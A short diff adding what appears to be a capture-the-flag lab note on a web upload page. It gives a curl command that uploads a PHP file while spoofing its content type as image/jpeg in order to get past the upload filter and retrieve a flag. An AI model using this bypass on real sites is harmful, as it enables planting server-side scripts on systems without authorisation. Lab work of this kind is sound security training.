@@ -1,0 +1,6 @@
+On the upload page, you can upload a file, and change the type of upload data.
+
+I created a test.php file and used curl for the POST request.
+
+curl -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" "http://172.20.10.12/index.php?page=upload" | grep 'flag'
+
